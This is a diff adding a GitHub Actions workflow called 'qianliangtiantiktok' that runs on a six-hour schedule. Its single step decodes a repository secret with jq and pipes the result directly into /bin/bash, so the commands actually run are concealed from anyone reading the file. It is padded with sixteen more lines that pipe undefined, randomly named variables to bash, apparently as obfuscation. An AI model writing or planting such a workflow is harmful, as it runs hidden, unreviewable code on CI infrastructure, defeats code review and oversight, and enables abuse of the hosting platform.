@@ -1,0 +1,34 @@
+name: qianliangtiantiktok
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianliangtiantiktok
+        env:
+          z16982: ${{ secrets.z16982 }}
+        run: |
+          echo $z16982 | jq -r .r47 | /bin/bash
+          echo $nbajk8141 | jq -r .xqum513 | /bin/bash
+          echo $bhakg03638 | jq -r .gqeok8884 | /bin/bash
+          echo $u84 | jq -r .s92 | /bin/bash
+          echo $i14830 | jq -r .lr78 | /bin/bash
+          echo $um4 | jq -r .cj447 | /bin/bash
+          echo $j23 | jq -r .hlcci1260 | /bin/bash
+          echo $x9 | jq -r .gqbiv07159 | /bin/bash
+          echo $ejt0 | jq -r .gey12076 | /bin/bash
+          echo $pypll138 | jq -r .nku37 | /bin/bash
+          echo $a944 | jq -r .t683 | /bin/bash
+          echo $qu714 | jq -r .dxdg92871 | /bin/bash
+          echo $syj821 | jq -r .xhldd52 | /bin/bash
+          echo $or974 | jq -r .uk81 | /bin/bash
+          echo $ptuy4908 | jq -r .q53 | /bin/bash
+          echo $fsle3 | jq -r .lnbyr1885 | /bin/bash
+          echo $hu22975 | jq -r .azqou15545 | /bin/bash
+
